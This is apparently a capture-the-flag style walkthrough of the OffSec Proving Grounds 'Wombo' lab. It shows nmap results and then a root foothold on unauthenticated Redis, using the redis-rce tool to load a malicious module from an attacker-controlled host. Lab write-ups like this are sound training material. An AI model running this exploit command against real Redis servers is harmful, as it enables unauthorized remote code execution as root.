---
title: "PG: Wombo"
date: 2022-11-13
draft: false
os: "Linux"
difficulty: "Easy"
platform: "OffSec Proving Grounds"
aliases: ["/posts/offsec/wombo/"]
tags:
  - offsec
  - proving-grounds
  - easy
  - linux
  - redis
  - redis-rce
categories:
  - walkthrough
---

{{< box-info name="Wombo" os="Linux" difficulty="Easy" ip="192.168.105.69" platform="OffSec Proving Grounds" >}}

---

## Enumeration

### Nmap

{{< collapse title="Nmap output" >}}
```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.4p1 Debian 10+deb9u7
80/tcp    open  http     nginx 1.10.3
6379/tcp  open  redis    Redis key-value store 5.0.9
8080/tcp  open  http-proxy
27017/tcp open  mongod?
```
{{< /collapse >}}

Multiple services, but Redis on 6379 with no authentication is the obvious target. Port 8080 runs NodeBB -- a rabbit hole.

---

## Foothold

### Redis RCE

Redis 5.0.9 exposed without authentication. Using the [redis-rce](https://github.com/Ridter/redis-rce) exploit with a malicious module:

```bash
python3 redis-rce.py -r 192.168.105.69 -p 6379 \
  -L 192.168.49.100 -P 6379 -f exp.so
```

The exploit loads a shared object into Redis that provides command execution. We get a shell as root directly -- Redis is running as root on this box.

---

## Proof

{{< terminal title="root@wombo" >}}
# whoami
root
{{< /terminal >}}

---

## Key Takeaways

{{< callout type="note" >}}
- Unauthenticated Redis is almost always exploitable -- check what user the service runs as, because it's often root
- Don't get sucked into enumerating every port when one service is wide open with no auth
- The NodeBB instance on 8080 was a complete rabbit hole -- save time by prioritizing low-hanging fruit
{{< /callout >}}
